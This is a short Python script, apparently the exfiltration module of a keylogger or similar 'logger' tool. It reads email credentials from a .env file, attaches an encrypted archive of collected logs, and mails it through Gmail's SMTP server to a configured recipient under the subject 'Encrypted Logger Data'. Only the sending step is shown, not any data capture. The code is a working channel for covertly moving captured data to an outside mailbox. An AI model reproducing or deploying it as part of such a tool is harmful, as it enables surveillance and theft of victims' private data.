import smtplib
from email.message import EmailMessage
import os
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Credentials and target
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
TO_EMAIL = os.getenv("TO_EMAIL")

def send_email():
    """Compress and send the encrypted logs via email."""
    if not os.path.exists("logs_encrypted.zip"):
        print("[!] logs_encrypted.zip not found.")
        return

    msg = EmailMessage()
    msg["Subject"] = "Encrypted Logger Data"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = TO_EMAIL

    with open("logs_encrypted.zip", "rb") as file:
        msg.add_attachment(
            file.read(),
            maintype="application",
            subtype="zip",
            filename="logs_encrypted.zip"
        )

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
            print("[+] Email sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send email: {e}")
